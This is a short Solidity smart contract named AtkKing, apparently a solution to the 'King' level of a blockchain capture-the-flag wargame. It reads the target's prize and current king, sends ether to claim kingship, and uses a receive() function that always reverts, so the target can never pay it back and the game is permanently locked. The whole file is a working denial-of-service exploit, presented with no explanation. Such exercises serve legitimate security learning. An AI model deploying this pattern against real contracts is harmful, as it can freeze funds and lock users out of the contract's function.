// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface King {
  function _king() external view returns(address);
  function prize() external view returns(uint256);
}


contract AtkKing {

    function checkPrizeKing(address _kingAddress) public view returns(uint256) {
      return King(_kingAddress).prize();
    }

    function checkKing(address _kingAddress) public view returns(address) {
      return King(_kingAddress)._king();
    }


     function callKing(address _kingAddress) public payable  {
       (bool s,) = address(_kingAddress).call{value:msg.value}("");
       require(s);
    }

      receive() external payable {
        revert("avoid  reclaim kingship");
    }
}